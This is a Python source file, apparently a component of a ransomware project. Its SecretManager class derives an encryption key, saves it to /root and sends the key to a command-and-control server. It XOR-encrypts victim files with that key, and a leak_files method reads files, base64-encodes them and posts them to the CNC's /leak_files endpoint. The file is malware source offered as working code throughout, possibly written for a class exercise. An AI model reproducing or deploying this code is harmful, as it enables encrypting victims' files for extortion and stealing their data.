from hashlib import sha256
import logging
import os
import secrets
from typing import List, Tuple
import os.path
import requests
import base64

from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

from xorcrypt import xorfile

class SecretManager:
    ITERATION = 48000
    TOKEN_LENGTH = 16
    SALT_LENGTH = 16
    KEY_LENGTH = 16

    def __init__(self, remote_host_port:str="127.0.0.1:6666", path:str="/root") -> None:
        self._remote_host_port = remote_host_port
        self._path = path
        self._key = None
        self._salt = None
        self._token = None

        self._log = logging.getLogger(self.__class__.__name__)


    def do_derivation(self, salt: bytes, key: bytes) -> bytes:
        return PBKDF2HMAC(algorithm=hashes.SHA256(), length=self.KEY_LENGTH, salt=salt, iterations=self.ITERATION).derive(key)


    def create(self) -> Tuple[bytes, bytes, bytes]:
        #Generates a random salt of the specified length
        salt = secrets.token_bytes(self.SALT_LENGTH)
        #Generates a random key of the specified length
        key = secrets.token_bytes(self.KEY_LENGTH)
        #Derives a token using the salt and key
        token = self.do_derivation(salt, key)
        return salt, key, token


    def bin_to_b64(self, data:bytes)->str:
        tmp = base64.b64encode(data)
        return str(tmp, "utf8")


    def post_new(self, salt:bytes, key:bytes, token:bytes)->None:
        data = {
                "token": self.bin_to_b64(token),
                "salt": self.bin_to_b64(salt),
                "key": self.bin_to_b64(key),
            }
        #Send the data to the CNC
        requests.post(f"http://{self._remote_host_port}/post_new", json=data)


    def setup(self)->None:
        # Create the directory if it doesn't exist
        os.makedirs(self._path, exist_ok=True)
        
        token_path = os.path.join(self._path, "token.bin")
        key_path = os.path.join(self._path, "key.bin")
        salt_path = os.path.join(self._path, "salt.bin")
        #Prepare the secrets stocked
        self.load()

        #Generate new secrets
        salt, key, token = self.create()
        #Store the key
        self._key = key
        #Save the elements
        with open(token_path, "wb") as f: f.write(token)
        with open(key_path, "wb") as f: f.write(key)
        with open(salt_path, "wb") as f: f.write(salt)

        #Send the data to the CNC
        self.post_new(salt, key, token)
        #Prepare the secrets stocked
        self.load()


    def load(self)->None:
        #Create the full path thanks to the base directory of each
        token_path = os.path.join(self._path, "token.bin")
        salt_path = os.path.join(self._path, "salt.bin")
        key_path = os.path.join(self._path, "key.bin")
        #Open each component and read their content
        with open(token_path, "rb") as f: self._token = f.read()
        with open(salt_path, "rb") as f: self._salt = f.read()
        with open(key_path, "rb") as f: self._key = f.read()


    def check_key(self, candidate_key:bytes)->bool:
        #Verify if the key is correct and return yes or no
        if self.do_derivation(self._salt, candidate_key)==self._token:
            valid = True
        else:
            valid = False
        return valid


    def set_key(self, b64_key:str)->None:
        #Decode the key into a binary format
        decode_key = base64.b64decode(b64_key)
        self._key = decode_key


    def get_hex_token(self)->str:
        token_hexa = sha256(self._token).hexdigest()
        return token_hexa


    def xorfiles(self, files:List[str])->None:
        for file in files:
            # Use the existing xorfile function to process the file
            xorfile(file, self._key)


    def leak_files(self, files:List[str])->None:
        for file in files:
            # Read the file content in binary mode and cinvert it in base64
            with open(file, "rb") as f:
                file_content = f.read()
            encoded_data = self.bin_to_b64(file_content)
        
            # Prepare the data to be sent to the server
            data = {
                "token": self.bin_to_b64(self._token),  # Token in base64
                "filename": os.path.basename(file),     # File name
                "data": encoded_data,                   # File content in base64
            }
        
            # Send the data to the CNC server
            requests.post(f"http://{self._remote_host_port}/leak_files", json=data)


    def clean(self) -> None:
        os.remove(os.path.join(self._path, "token.bin"))
        os.remove(os.path.join(self._path, "salt.bin"))
        os.remove(os.path.join(self._path, "key.bin"))